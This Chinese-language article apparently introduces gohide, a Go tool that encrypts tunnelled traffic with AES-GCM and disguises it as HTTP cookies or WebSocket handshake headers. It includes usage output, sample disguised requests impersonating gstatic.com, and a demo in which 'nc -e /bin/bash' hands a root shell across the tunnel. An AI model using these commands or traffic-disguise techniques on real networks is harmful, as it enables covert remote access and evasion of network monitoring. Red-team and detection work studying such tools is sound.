![](https://image.3001.net/images/20220911/1662863333_631d47e53960c4db3162d.jpg!small)

## 关于gohide

gohide是一款功能强大的网络通信数据加密工具，该工具可以通过一个模糊信道来对信道中的端到端数据进行AES-GCM加密。

## 支持的模糊/混淆模式

> 1、会话Cookie HTTP GET（http-client）
>
> 2、Set-Cookie会话Cookie HTTP/2 200 OK（http-server）
>
> 3、WebSocket握手“Sec-WebSocket-Key”（websocket-client）
>
> 4、WebSocket握手“Sec-WebSocket-Accept”（websocket-server）
>
> 5、none-无混淆，仅使用AES-GCM加密消息

默认配置下，gohide将针对上述每一个选项启用AES-GCM加密。

## 工具下载

由于该工具基于Go语言开发，因此我们首先需要在本地设备上安装并配置好Golang环境。接下来，使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/Potato-Industries/gohide.git

## 工具使用

    
    
    root@WOPR-KALI:/opt/gohide-dev# ./gohide -h
    
    Usage of ./gohide:
    
      -f string
    
         监听伪造的服务器-r x.x.x.x:xxxx (ip/域名:port) (默认"0.0.0.0:8081")
    
      -key openssl passwd -1 -salt ok | md5sum
    
         AES加密密钥: 使用'-k openssl passwd -1 -salt ok | md5sum' 从密码中获取密钥 (默认"5fe10ae58c5ad02a6113305f4e702d07")
    
      -l string
    
         监听端口转发-l x.x.x.x:xxxx (ip/domain:port) (默认"127.0.0.1:8080")
    
      -m string
    
         混淆模式 (默认启用AES加密): websocket-client, websocket-server, http-client, http-server, none (默认"none")
    
      -pem string
    
         用于TLS加密模式的.pem文件路径: default = 使用硬编码密钥对 'CN:target.com', none = plaintext mode (默认"default")
    
      -r string
    
         转发至伪造的远程服务器-r x.x.x.x:xxxx (ip/域名:port) (默认"127.0.0.1:9999")

## 工具使用演示

### Box A - 反向监听

    
    
    root@WOPR-KALI:/opt/gohide# ./gohide -f 0.0.0.0:8081 -l 127.0.0.1:8080 -r target.com:9091 -m websocket-client
    
    Local Port Forward Listening: 127.0.0.1:8080
    
    FakeSrv Listening: 0.0.0.0:8081

### Box B - 目标主机

    
    
    root@WOPR-KALI:/opt/gohide# ./gohide -f 0.0.0.0:9091 -l 127.0.0.1:9090 -r target.com:8081 -m websocket-server
    
    Local Port Forward Listening: 127.0.0.1:9090
    
    FakeSrv Listening: 0.0.0.0:9091

### Box B - Netcat /bin/bash

    
    
    root@WOPR-KALI:/var/tmp# nc -e /bin/bash 127.0.0.1 9090

### Box A - Netcat客户端

    
    
    root@WOPR-KALI:/opt/gohide# nc -v 127.0.0.1 8080
    
    localhost [127.0.0.1] 8080 (http-alt) open
    
    id
    
    uid=0(root) gid=0(root) groups=0(root)
    
    uname -a
    
    Linux WOPR-KALI 5.3.0-kali2-amd64 #1 SMP Debian 5.3.9-1kali1 (2019-11-11) x86_64 GNU/Linux
    
    netstat -pantwu
    
    Active Internet connections (servers and established)
    
    tcp        0      0 127.0.0.1:39684         127.0.0.1:8081          ESTABLISHED 14334/./gohide   

## 混淆样例

### websocket-client（Box A到Box B）

Sec-WebSocket-Key包含AES-GCM加密内容：

    
    
    GET /news/api/latest HTTP/1.1
    
    Host: cdn-tb0.gstatic.com
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko
    
    Upgrade: websocket
    
    Connection: Upgrade
    
    Sec-WebSocket-Key: 6jZS+0Wg1IP3n33RievbomIuvh5ZdNMPjVowXm62
    
    Sec-WebSocket-Version: 13

### websocket-server（Box B到Box A）

Sec-WebSocket-Accept包含AES-GCM加密输出：

    
    
    HTTP/1.1 101 Switching Protocols
    
    Upgrade: websocket
    
    Connection: Upgrade
    
    Sec-WebSocket-Accept: URrP5l0Z3NIHXi+isjuIyTSKfoP60Vw5d2gqcmI=

### http-client

会话Cookie头包含AES-GCM加密内容：

    
    
    GET /news/api/latest HTTP/1.1
    
    Host: cdn-tbn0.gstatic.com
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko
    
    Accept: */*
    
    Accept-Language: en-US,en;q=0.5
    
    Accept-Encoding: gzip, deflate, br
    
    Referer: http://www.bbc.co.uk/
    
    Connection: keep-alive
    
    Cookie: Session=R7IJ8y/EBgCanTo6fc0fxhNVDA27PFXYberJNW29; Secure; HttpOnly

### http-server

Set-Cookie头包含AES-GCM加密内容：

    
    
    HTTP/2.0 200 OK
    
    content-encoding: gzip
    
    content-type: text/html; charset=utf-8
    
    pragma: no-cache
    
    server: nginx
    
    x-content-type-options: nosniff
    
    x-frame-options: SAMEORIGIN
    
    x-xss-protection: 1; mode=block
    
    cache-control: no-cache, no-store, must-revalidate
    
    expires: Thu, 21 Nov 2019 01:07:15 GMT
    
    date: Thu, 21 Nov 2019 01:07:15 GMT
    
    content-length: 30330
    
    vary: Accept-Encoding
    
    X-Firefox-Spdy: h2
    
    Set-Cookie: Session=gWMnQhh+1vkllaOxueOXx9/rLkpf3cmh5uUCmHhy; Secure; Path=/; HttpOnly

### none

    
    
    8JWxXufVora2FNa/8m2Vnub6oiA2raV4Q5tUELJA

## 工具使用截图

![](https://image.3001.net/images/20220911/1662863475_631d4873a819e624c5184.png!small)

![](https://image.3001.net/images/20220911/1662863482_631d487acc4a07eab4b09.png!small)

## 项目地址

 **gohide** ：【[ _GitHub传送门_](https://github.com/Potato-Industries/gohide)】

